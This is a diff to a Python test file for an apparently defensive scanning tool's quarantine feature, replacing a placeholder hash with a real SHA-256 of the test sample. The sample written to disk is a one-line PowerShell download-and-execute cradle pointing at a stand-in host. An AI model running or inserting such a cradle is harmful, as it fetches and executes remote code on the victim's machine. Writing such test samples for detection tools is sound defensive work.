@@ -1,5 +1,7 @@
 """Tests for quarantine: isolate, restore, delete — all reversible and safe."""
 
+import hashlib
+
 import pytest
 
 from warden.config import Config
@@ -15,7 +17,8 @@ def test_quarantine_isolate_restore_roundtrip(tmp_path):
     victim = tmp_path / "bad.ps1"
     payload = b"IEX (New-Object Net.WebClient).DownloadString('http://x')"
     victim.write_bytes(payload)
-    result = FileResult(path=str(victim), size=len(payload), sha256="deadbeef",
+    result = FileResult(path=str(victim), size=len(payload),
+                        sha256=hashlib.sha256(payload).hexdigest(),
                         findings=[Finding("yara", "x", Severity.HIGH)])
 
     q = _q(tmp_path)
